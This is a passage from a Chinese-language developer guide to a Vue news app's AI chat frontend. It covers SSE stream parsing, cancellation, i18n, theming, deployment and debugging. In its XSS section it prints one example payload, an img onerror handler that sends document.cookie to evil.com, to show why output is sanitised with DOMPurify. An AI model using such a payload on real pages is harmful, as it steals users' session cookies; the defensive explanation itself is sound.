  const userMessage = userInput.value.trim()
  messages.value.push({ role: 'user', content: userMessage })
  userInput.value = ''                        // 立刻清空输入框

  // ② 添加AI消息占位
  messages.value.push({ role: 'assistant', content: '' })

  await nextTick()                            // ③ 等 DOM 更新
  scrollToBottom()

  isLoading.value = true
  try {
    await fetchAIResponse()
  } catch (error) {
    const isAbort = error?.name === 'AbortError'
    const last = messages.value[messages.value.length - 1]
    if (isAbort) {
      if (!last.content) last.content = '（已停止生成）'
    } else {
      console.error('Error fetching AI response:', error)
      last.content = `发生错误: ${error.message || '请检查网络连接'}`
    }
  } finally {
    isLoading.value = false
    controller = null
    await nextTick()
    scrollToBottom()
  }
}
```

**② 为什么先插入一条空的 assistant 消息？**

因为模板里有个"打字指示器"（三个跳动的点）：

```vue
<div v-if="message.role === 'assistant' && message.content === ''" class="typing-indicator">
  <span></span><span></span><span></span>
</div>
```

**空字符串是这个指示器的触发条件。** 先插入空消息，
用户立刻看到"AI 正在思考"的动画，而不是傻等。
等第一个字符流回来，`content` 不再是空，自动切换成显示文字。

**③ `await nextTick()` 是什么？**

Vue 的数据更新是**异步批量**的。你改了 `messages.value`，
DOM 不会立刻更新，而是等当前同步代码执行完再统一更新。

`nextTick()` 返回一个 Promise，等 DOM 更新完成后 resolve。
所以 `await nextTick()` 之后的 `scrollToBottom()` 才能拿到**更新后的**高度，
滚到真正的底部。

**③ 的取消处理：**

```javascript
if (isAbort) {
  if (!last.content) last.content = '（已停止生成）'
}
```

用户主动取消时（`AbortError`）：
- 已经生成了内容 → **保留内容**（不做任何处理）
- 一个字都没生成 → 显示"（已停止生成）"

这样比统一显示"操作已取消"体贴得多。

#### 构建多轮对话上下文

```javascript
const fetchAIResponse = async () => {
  // 排除最后一条空的 assistant 占位消息，其余作为多轮对话上下文
  const history = messages.value
    .slice(0, -1)                                        // ① 去掉最后一条
    .filter((msg) => msg.content && msg.content.trim())  // ② 过滤空的
    .map((msg) => ({ role: msg.role, content: msg.content }))  // ③ 只保留必要字段

  controller = new AbortController()

  const response = await fetch(aiChatConfig.streamEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'text/event-stream',
    },
    body: JSON.stringify({
      // 最后一条 user 消息作为本次提问，之前的作为历史
      message: history.length ? history[history.length - 1].content : '',
      history,
    }),
    signal: controller.signal,
  })
  ...
}
```

**①②③ 三步的数据加工：**

```
messages 里的原始数据：
[
  { role: 'assistant', content: '你好！我是AI助手...' },   ← 开场白
  { role: 'user',      content: '今天有什么新闻' },
  { role: 'assistant', content: '今天有...' },
  { role: 'user',      content: '再详细说说' },
  { role: 'assistant', content: '' },                     ← 空占位，要去掉
]

① slice(0, -1) 去掉最后一条 →
[
  { role: 'assistant', content: '你好！我是AI助手...' },
  { role: 'user',      content: '今天有什么新闻' },
  { role: 'assistant', content: '今天有...' },
  { role: 'user',      content: '再详细说说' },
]

② filter 过滤空内容 → （本例中没有空的，不变）

③ map 只保留 role/content → （本来就是这两个字段）

最终发给后端：
{
  "message": "再详细说说",
  "history": [ ...上面 4 条... ]
}
```

**后端收到后**（参看 `BACKEND_GUIDE.md` 第 12 步）会：
1. 加上服务端的 `system` 提示词
2. 过滤掉前端可能伪造的 `system` 消息
3. 检查最后一条是不是已经是同内容的 user 消息（避免重复）

**为什么要传整个 history 而不只是最后一句话？**

因为大模型 API 是**无状态**的。它不知道"上一次对话说了什么"。
所谓"记住上下文"，原理是**每次都把完整对话重新发一遍**。

不传 history 的话：

```
用户：今天有什么新闻？
AI：今天有 A、B、C 三条...
用户：再详细说说
AI：请问您想让我详细说说哪方面的内容？   ← 它不记得上一句了
```

传了 history：

```
用户：再详细说说
AI：好的，关于 A 新闻，具体情况是...      ← 正确理解了指代
```

#### SSE 流式解析

```javascript
  if (!response.ok) {
    let detail = `HTTP error! status: ${response.status}`
    try {
      const error = await response.json()
      detail = error.message || error.detail || detail
    } catch (e) {
      // 响应体不是 JSON，沿用默认提示
    }
    throw new Error(detail)
  }

  if (!response.body) {
    throw new Error('当前浏览器不支持流式响应')
  }

  const reader = response.body.getReader()
  const decoder = new TextDecoder()
  let buffer = ''
  let aiResponse = ''

  while (true) {
    const { done, value } = await reader.read()
    if (done) break

    buffer += decoder.decode(value, { stream: true })
    // SSE 以「空行」分隔事件，这里按行切分后保留最后一段不完整数据
    const lines = buffer.split('\n')
    buffer = lines.pop() || ''

    for (const line of lines) {
      if (!line.startsWith('data:')) continue

      const data = line.slice(5).trim()
      if (!data || data === '[DONE]') continue

      try {
        const json = JSON.parse(data)

        // 后端在流中间报错时会推送 { error: "..." }
        if (json.error) {
          throw new Error(json.error)
        }

        const content = json.content || ''
        if (content) {
          aiResponse += content
          messages.value[messages.value.length - 1].content = aiResponse
          await nextTick()
          scrollToBottom()
        }
      } catch (e) {
        if (e instanceof SyntaxError) {
          console.error('Error parsing SSE data:', e)
          continue
        }
        throw e
      }
    }
  }
```

**这段是整个前端最需要仔细理解的部分。**

**① 为什么用 `fetch` + `getReader()` 而不是 axios？**

axios 会等整个响应接收完才给你数据（它基于 XHR）。
要实现"边收边渲染"，必须用 `fetch` 的 **ReadableStream** 逐块读取。

**② `buffer` 和 `lines.pop()` 在解决什么？**

网络传输是**按字节块**的，不保证每次都刚好切在一行的边界上。假设后端发了：

```
data: {"content":"你"}\n\ndata: {"content":"好"}\n\n
```

浏览器可能分两次给你：

```javascript
// 第一次 read() 收到
'data: {"content":"你"}\n\ndata: {"cont'

// 第二次 read() 收到
'ent":"好"}\n\n'
```

如果直接按 `\n` 切开处理，第一条会尝试 `JSON.parse('{"cont')` → 报错。

解决办法是**把不完整的最后一段留在 buffer 里**：

```javascript
buffer += decoder.decode(value, { stream: true })   // 累积
const lines = buffer.split('\n')                    // 按行切开
buffer = lines.pop() || ''                          // ★ 最后一段放回 buffer
//         └─ pop() 移除并返回数组最后一个元素
//            它就是"可能不完整"的那一段
```

**这里有个细节**：`JSON.parse` 报错时用的是 `e instanceof SyntaxError` 来判断：

```javascript
} catch (e) {
  if (e instanceof SyntaxError) {
    console.error('Error parsing SSE data:', e)
    continue                          // 解析失败就跳过这一行
  }
  throw e                             // 其它错误（比如 json.error）往上抛
}
```

因为 `throw new Error(json.error)` 也会被这个 catch 捕获。
用 `instanceof SyntaxError` 区分："JSON 格式错了（可跳过）"vs"后端报告业务错误（要抛出）"。

**③ `decoder.decode(value, { stream: true })` 的 `stream: true` 是什么？**

`TextDecoder` 默认按"完整字符"解码。但 UTF-8 里一个中文字占 3 个字节，
如果这 3 个字节被切在两个 chunk 里，默认模式会解码出乱码。

`{ stream: true }` 告诉解码器："这是流的一部分，遇到不完整的字符先缓存着"。

**这个参数漏了的话，中文回复会出现 `�` 乱码。** 是流式处理的经典坑。

**④ 逐字更新 UI：**

```javascript
aiResponse += content
messages.value[messages.value.length - 1].content = aiResponse
await nextTick()
scrollToBottom()
```

每次都把完整的 `aiResponse` 赋给最后一条消息，
Vue 检测到变化就重新渲染这一段文字，产生"逐字打字"的效果。

#### 可中断生成

```javascript
let controller = null

const onSendClick = () => {
  if (isLoading.value) {
    controller?.abort()          // 正在生成 → 点击就是取消
    return
  }
  sendMessage()                  // 空闲 → 点击就是发送
}
```

```javascript
controller = new AbortController()

const response = await fetch(aiChatConfig.streamEndpoint, {
  ...
  signal: controller.signal,     // ★ 把 signal 传给 fetch
})
```

`AbortController` 是浏览器的标准 API：

```
controller.abort()
      ↓
controller.signal 触发 abort 事件
      ↓
fetch 收到信号，中断请求
      ↓
await reader.read() 抛出 AbortError
      ↓
被 sendMessage 的 catch 捕获
```

**模板里的按钮文案动态切换：**

```vue
<van-button
  type="primary"
  class="send-button"
  :disabled="!isLoading && !userInput.trim()"
  @click="onSendClick"
>
  {{ isLoading ? cancelText : sendText }}
</van-button>
```

`isLoading` 为真时：
- 文案变成"取消"
- `:disabled` 的条件是 `!isLoading && !userInput.trim()` → `false`，
  所以按钮**可点击**（用于取消）

`isLoading` 为假时：
- 文案是"发送"
- 输入框为空 → `!input.trim()` 为真 → 按钮**禁用**

**注意 `class="send-button"` 和所有 CSS 都未改动** ——
只改了按钮内的文案绑定，视觉完全一致。

#### 组件卸载时清理

```javascript
onBeforeUnmount(() => {
  controller?.abort()
})
```

如果用户在 AI 正在回答时离开页面，不中断请求的话，
回调还会尝试更新已经销毁的组件的响应式数据 —— 虽然 Vue 3 不会报错，
但属于资源泄漏。`onBeforeUnmount` 里主动中断是良好习惯。

#### Markdown 渲染与 XSS 防护

```javascript
import { marked } from 'marked'
import DOMPurify from 'dompurify'

const formatMessage = (content) => {
  if (!content) return ''
  // 使用marked解析Markdown，并用DOMPurify清理HTML，防止 XSS
  return DOMPurify.sanitize(marked.parse(content))
}
```

```vue
<div v-else v-html="formatMessage(message.content)"></div>
```

**两步处理，缺一不可：**

```
AI 返回的 Markdown 文本
   "**加粗** 和 `代码`"
        ↓  marked.parse()
   "<p><strong>加粗</strong> 和 <code>代码</code></p>"
        ↓  DOMPurify.sanitize()
   安全的 HTML（移除了 <script>、onclick 等危险内容）
        ↓  v-html
   渲染到页面
```

**为什么必须用 DOMPurify？**

`v-html` 会原样插入 HTML 并执行其中的脚本。
如果 AI 回复里包含（或被诱导包含）这样的内容：

```html
<img src=x onerror="fetch('http://evil.com/?cookie=' + document.cookie)">
```

浏览器会执行 `onerror` 里的 JS，**窃取用户的 Cookie**。
这就是 XSS（跨站脚本攻击）。

DOMPurify 会移除所有事件属性（`onerror`、`onclick`）和危险标签（`<script>`），
只保留安全的排版标签。

**`import { marked }` 而不是 `import * as marked`**（改造点）：

```javascript
import * as marked from 'marked'   // 改造前：导入整个命名空间对象
import { marked } from 'marked'    // 改造后：只导入需要的
```

marked v16 同时提供命名导出和默认导出。
用命名导入更明确，也便于构建工具做 tree-shaking（剔除未使用的代码）。

#### 自动滚动到底部

```javascript
const messagesContainer = ref(null)

const scrollToBottom = () => {
  if (messagesContainer.value) {
    messagesContainer.value.scrollTop = messagesContainer.value.scrollHeight
  }
}
```

```vue
<div class="messages-container" ref="messagesContainer">
```

**原理：** 把容器的 `scrollTop` 设为 `scrollHeight`（内容总高度），
就会滚到最底部。这是最简洁的滚动到底部实现。

```javascript
// 监听消息变化，自动滚动
watch(messages, () => {
  nextTick(scrollToBottom)
}, { deep: true })
```

- `deep: true`：深度监听。因为 `messages` 是数组，
  我们改的是 `messages[i].content`（数组元素的属性），
  浅监听不会触发，必须用深度监听。
- `nextTick(scrollToBottom)`：等 DOM 更新完再滚，否则算出来的高度是旧的。

#### i18n 接入（改造点）

```javascript
const { t } = useI18n()
const sendText = t('aiChat.send')
const cancelText = t('common.cancel')
```

```vue
<van-nav-bar :title="$t('aiChat.title')" fixed />
<van-field :placeholder="$t('aiChat.placeholder')" ... />
```

改造前这些文案是**硬编码的中文**。
而 `zh-CN.js` / `en-US.js` 里其实**早就写好了 `aiChat` 语言包**，
只是从来没用过。

现在接上之后，切到英文界面时 AI 页的标题、占位符、按钮都会跟着变。

---

## 第 11 步：国际化与主题

### 国际化：`src/i18n/index.js`

```javascript
import { createI18n } from 'vue-i18n'
import zhCN from './locales/zh-CN.js'
import enUS from './locales/en-US.js'

export function setupI18n() {
  // 在创建i18n实例前获取语言设置
  const savedLanguage = localStorage.getItem('language') || 'zh-CN'

  const i18n = createI18n({
    legacy: false,          // ① 使用组合式 API
    locale: savedLanguage,  // ② 当前语言
    fallbackLocale: 'zh-CN',// ③ 找不到翻译时的兜底语言
    messages: {
      'zh-CN': zhCN,
      'en-US': enUS
    }
  })

  return i18n
}
```

**① `legacy: false` 决定了两件事：**

```javascript
// legacy: true（旧模式）
i18n.global.locale = 'en-US'            // 直接赋值

// legacy: false（组合式模式，本项目用这个）
i18n.global.locale.value = 'en-US'      // 需要通过 .value
```

因为组合式模式下 `locale` 是一个 `ref`，必须通过 `.value` 访问。

**② 从 localStorage 读语言** —— 记住用户的选择，刷新后不丢失。

**③ `fallbackLocale`** —— 如果英文包里漏了某个 key，
自动回退到中文，而不是显示 `aiChat.title` 这样的原始 key。

### 语言包结构：`src/i18n/locales/zh-CN.js`

```javascript
export default {
  common: {
    confirm: '确认', cancel: '取消', back: '返回',
    loading: '加载中...', save: '保存', delete: '删除',
    edit: '编辑', search: '搜索', notFound: '未找到内容',
    login: '登录', register: '注册', logout: '退出登录',
    allCategories: '全部分类'
  },
  nav: {
    home: '首页', aiChat: 'AI问答', my: '我的'
  },
  home: {
    title: '新闻资讯', more: '更多', refresh: '刷新',
    loadMore: '加载更多', noMore: '没有更多了',
    categories: {
      headline: '头条', society: '社会', domestic: '国内',
      international: '国际', entertainment: '娱乐', sports: '体育',
      military: '军事', technology: '科技', finance: '财经', more: '更多'
    }
  },
  aiChat: {
    title: 'AI问答', placeholder: '请输入您的问题...',
    send: '发送', thinking: 'AI思考中...'
  },
  my: { ... },
  settings: { ... },
  profile: { ... }
}
```

**按"页面/模块"分组**，key 的路径就是访问路径：

```
common.confirm        → '确认'
nav.home              → '首页'
home.categories.headline → '头条'
aiChat.title          → 'AI问答'
```

**两种使用方式：**

```vue
<!-- 模板里：用 $t -->
<van-tabbar-item to="/home">{{ $t('nav.home') }}</van-tabbar-item>
```

```javascript
// script 里：用 useI18n()
import { useI18n } from 'vue-i18n'
const { t } = useI18n()
showToast(t('settings.themeChanged'))
```

### 主题切换：`src/views/Settings.vue`

```javascript
const themeStore = useThemeStore()
const themeList = computed(() => themeStore.getAllThemes)
const currentTheme = computed(() => themeStore.getCurrentTheme)

const changeTheme = (themeId) => {
  themeStore.setTheme(themeId)
  showToast(t('settings.themeChanged'))
  showThemePopup.value = false
}
```

```vue
<van-popup v-model:show="showThemePopup" position="bottom" round :style="{ height: '40%' }">
  <div class="popup-title">{{ $t('settings.selectTheme') }}</div>
  <div class="theme-list">
    <div v-for="theme in themeList" :key="theme.id" class="theme-item"
         :class="{ active: currentTheme === theme.id }" @click="changeTheme(theme.id)">
      <div class="theme-color" :style="{ backgroundColor: theme.primaryColor }"></div>
      <div class="theme-name">{{ theme.name }}</div>
    </div>
  </div>
</van-popup>
```

`position="bottom"` + `round` 是移动端最常用的弹层样式：
从底部滑出、顶部圆角，符合手机 App 的交互习惯。

### 语言切换（改造点）

```javascript
const changeLanguage = () => {
  languageStore.setLanguage(currentLanguage.value)
  // 直接切换 i18n 的语言即可，无需刷新页面
  locale.value = currentLanguage.value
  showLanguagePopup.value = false
  showToast(t('settings.languageChanged'))
}
```

**改造前是这样的：**

```javascript
// ❌ 改造前
const changeLanguage = () => {
  languageStore.setLanguage(currentLanguage.value)
  locale.value = currentLanguage.value
  showLanguagePopup.value = false
  showToast(t('settings.languageChanged'))
  // 强制刷新页面以应用语言更改
  window.location.reload()        // ← 整页刷新！
}
```

`window.location.reload()` 的问题：
1. **整个应用重新加载** —— 白屏 1~2 秒
2. **丢失所有临时状态** —— 表单内容、滚动位置、AI 对话记录全部清空
3. **多余** —— `locale.value` 是响应式的，改完界面自动更新，根本不需要刷新

删掉这一行后，语言切换是**瞬间生效、无闪烁**的。

> ⚠️ 但要注意：如果代码里有硬编码的中文（比如 `NewsDetail.vue` 里的
> `title="新闻详情"`），切换语言时它们不会变。
> 这类文案需要改造成 `$t('...')` 才能正确响应。
> 本次为遵守"UI 不变"的要求，只接入了 AI 页，其余页面的硬编码文案保持原样。

---

## 第 12 步：一次交互的完整数据流

以「在 AI 对话页发送一条消息」为例，把前面所有内容串起来：

```
① 用户在 <van-field> 输入「今天有什么新闻」，点击「发送」按钮

② 触发 @click="onSendClick"
   └─ isLoading 为 false → 调用 sendMessage()

③ sendMessage() 的同步部分
   ├─ 检查输入非空 ✓
   ├─ 检查 aiReady ✓
   ├─ messages.push({ role: 'user', content: '今天有什么新闻' })
   ├─ userInput.value = ''          ← 输入框立刻清空
   └─ messages.push({ role: 'assistant', content: '' })
                                    ← 空占位，触发"打字指示器"动画

④ await nextTick() → DOM 更新完成
   ├─ 用户消息气泡出现
   └─ AI 气泡显示三个跳动的点
   scrollToBottom() 滚到底部

⑤ isLoading = true → 按钮文案变成「取消」

⑥ fetchAIResponse()
   ├─ slice(0,-1) 去掉空占位
   ├─ filter 过滤空内容
   ├─ map 只保留 role/content
   │   → history = [{role:'assistant',content:'你好！我是AI助手...'},
   │                {role:'user',content:'今天有什么新闻'}]
   ├─ controller = new AbortController()
   └─ fetch('/api/AIchat/chat/stream', {
        method: 'POST',
        body: JSON.stringify({
          message: '今天有什么新闻',
          history: [...]
        }),
        signal: controller.signal      ← 绑定中断信号
      })

⑦ 请求发到 5173（同源），Vite 代理转发到 8000
   （vite.config.js 里对 /api 的 proxy 配置）

⑧ 后端处理（详见 BACKEND_GUIDE.md 第 12 步）
   ├─ build_messages() 加上 system 提示词，过滤伪造的 system
   ├─ 调用 DeepSeek 流式接口
   └─ 逐字返回 SSE：
        data: {"content":"今"}
        data: {"content":"天"}
        ...

⑨ 前端 reader.read() 循环接收
   每次收到 chunk：
   ├─ buffer += decoder.decode(value, { stream: true })
   │            ↑ stream:true 防止中文被切断时乱码
   ├─ lines = buffer.split('\n')
   ├─ buffer = lines.pop()      ← 不完整的最后一段留着
   └─ 处理每个完整的行：
        if (!line.startsWith('data:')) continue
        const data = line.slice(5).trim()
        if (data === '[DONE]') continue
        const json = JSON.parse(data)
        if (json.error) throw new Error(json.error)   ← 后端报错
        aiResponse += json.content
        messages.value[last].content = aiResponse     ← 更新响应式数据
        await nextTick()
        scrollToBottom()

⑩ Vue 检测到 messages 变化 → 重新渲染
   └─ content 不再为空 → "打字指示器"消失，显示文字
   └─ 用户看到逐字输出的效果

⑪ 后端发完，推送 data: [DONE]
   reader.read() 返回 { done: true } → break 跳出循环

⑫ finally 块
   ├─ isLoading = false → 按钮变回「发送」
   ├─ controller = null
   └─ await nextTick(); scrollToBottom()

⑬ watch(messages, ..., { deep: true }) 也触发了一次
   └─ nextTick(scrollToBottom) 再滚一次（双保险）
```

### 如果用户中途点击「取消」

```
用户点「取消」
   ↓
onSendClick() → isLoading 为 true → controller.abort()
   ↓
fetch 收到 abort 信号，中断连接
   ↓
await reader.read() 抛 AbortError
   ↓
sendMessage 的 catch 捕获
   ├─ isAbort = true
   └─ 如果已生成内容 → 保留；否则显示「（已停止生成）」
   ↓
finally → isLoading = false，按钮变回「发送」
```

---

## 第 13 步：构建与部署

### 开发环境

```powershell
cd xwzx-news
npm install      # 首次运行
npm run dev
```

访问 http://127.0.0.1:5173

**Vite 开发服务器的特性：**
- **HMR（热模块替换）**：改 `.vue` 文件保存后，页面**不刷新**就更新了，
  而且组件状态（比如输入框内容）会保留
- **按需编译**：只编译你访问的页面，启动秒级

### 生产构建

```powershell
npm run build
```

产物在 `xwzx-news/dist/`：

```
dist/
├── index.html                             0.52 kB
└── assets/
    ├── index-CM4sSiGG.css               201.18 kB   ← Vant 样式
    ├── index-DNtOddOm.js                247.60 kB   ← Vue + Router + Pinia
    ├── AIChat-DqDiItkX.js                66.12 kB   ← marked + dompurify
    ├── http-B58TgrYg.js                  36.90 kB   ← axios
    ├── Home-Duyp2oon.js                   3.30 kB
    ├── Profile-MX4xbsdW.js                4.46 kB
    └── ...（每个页面一个 chunk）
```

**文件名里的哈希（如 `DNtOddOm`）是什么？**

这是**内容哈希**：文件内容变了，哈希就变，文件名也就变。

好处是可以设置永久缓存：

```
浏览器第一次访问 → 下载 index-DNtOddOm.js → 缓存 1 年
你重新构建 → 文件名变成 index-XyZ123Ab.js
用户再次访问 → index.html 引用的文件名变了 → 自动下载新文件
```

**这就是为什么能做到"缓存一年还不怕代码更新"。**

### 部署到单端口

```powershell
cd xwzx-news
npm run build

cd ..
Remove-Item -Recurse -Force static -ErrorAction SilentlyContinue
Copy-Item -Recurse xwzx-news\dist static

uvicorn main:app --host 0.0.0.0 --port 8000
```

现在 `http://服务器IP:8000` 同时提供页面和接口。

**为什么可以这样？** 因为：
1. 前端代码里请求的是相对路径 `/api/...`（`baseURL` 留空）
2. 同端口 → 同源 → 无跨域
3. 后端配了 SPA 回退 → 刷新 `/news/detail/1` 不 404

### 部署检查清单

| 项目 | 开发 | 生产 |
|---|---|---|
| `VITE_API_BASE_URL` | 留空 | 同端口留空；分域名则填后端地址 |
| `VITE_PROXY_TARGET` | `http://127.0.0.1:8000` | 不生效（只在 dev server 用） |
| `sourcemap` | - | `false`（不暴露源码） |
| HTTPS | 否 | **建议开启**（否则 token 明文传输） |

---

## 附录：常用调试技巧

### 1. 看请求有没有发出去

浏览器 F12 → **Network** 面板 → 点「发送」→ 看有没有 `/api/AIchat/chat/stream` 请求。

重点关注：
- **Status**：200 正常，401 未登录，404 路径错，500 后端报错
- **Response Headers → Content-Type**：应该是 `text/event-stream`
- **Timing**：流式请求会一直显示"pending"，直到结束

### 2. 看 SSE 流的内容

Network 面板里点那个请求 → **Response** 标签页，
能看到逐块到达的 `data: {"content":"..."}`。

如果这里是一次性全部出现的，说明**流被缓冲了**，
检查后端是否设置了 `X-Accel-Buffering: no`。

### 3. 看 Pinia 里的数据

装 Vue DevTools 浏览器扩展 → **Pinia** 标签页，
能看到所有 store 的实时状态。

也可以直接在 Console 里查：

```javascript
JSON.parse(localStorage.getItem('user-store'))
// → { userInfo: {...}, token: '...', isLogin: true }
```

### 4. 常见报错速查

| 现象 | 可能原因 | 排查 |
|---|---|---|
| 页面白屏 | JS 报错 | F12 → Console 看红色错误 |
| 所有接口 404 | Vite 代理没配 / 后端没启动 | 检查 `vite.config.js` 的 proxy 和 8000 端口 |
| 所有接口 401 | token 没带上 | Console 执行 `localStorage.getItem('user-token')` |
| 跨域报错 | 请求没走代理 | 确认请求 URL 是 `/api/...` 而非完整域名 |
| 字段都是空白 | 前后端命名不一致 | Network 看响应 JSON 是驼峰还是下划线 |
| 中文回复乱码 | TextDecoder 少了 `stream: true` | 检查 `AIChat.vue` 的解码参数 |
| AI 不逐字输出 | SSE 被缓冲 | 检查后端响应头 `X-Accel-Buffering` |
| 刷新后掉登录 | 持久化没生效 | Console 看 `localStorage.getItem('user-store')` |
| 主题切换后要刷新 | CSS 变量没应用 | 看 `<html>` 上的 style 有没有 `--background-color` |

### 5. 手动测试后端接口

```javascript
// 在浏览器 Console 里直接发请求
fetch('/api/news/categories').then(r => r.json()).then(console.log)

// 测试 AI 流式接口
fetch('/api/AIchat/chat/stream', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ message: '你好' })
}).then(async r => {
  const reader = r.body.getReader()
  const dec = new TextDecoder()
  while (true) {
    const { done, value } = await reader.read()
    if (done) break
    console.log(dec.decode(value, { stream: true }))
  }
})
```

### 6. 强制清空所有本地状态

```javascript
localStorage.clear()
location.reload()
```

当出现"数据不对但不知道哪里不对"时，先把本地缓存清干净再看。

---

## 总结：前端架构特点

| 特点 | 体现 |
|---|---|
| **请求统一收口** | 所有请求走 `http.js`，token 自动注入，错误统一整理 |
| **状态集中管理** | 4 个 store 分管用户/新闻/收藏/历史，页面只做展示 |
| **页面懒加载** | 11 个页面切成独立 chunk，首屏只加载需要的 |
| **零密钥** | 前端不含任何 API Key，AI 请求全部经自家后端 |
| **完整流式体验** | SSE 逐字输出、可中断、中文不乱码、Markdown 安全渲染 |
| **缓存策略清晰** | keep-alive 缓存首页/AI 页，详情页不缓存保证数据新鲜 |
| **降级可用** | 接口失败有兜底分类、本地兜底收藏状态，不白屏 |
| **主题与多语言** | CSS 变量驱动主题，i18n 语言包，均持久化到 localStorage |

---

> 📖 相关文档：`BACKEND_GUIDE.md`（后端如何提供这些接口）、
> `CHANGES.md`（本次修复的所有 bug 清单）
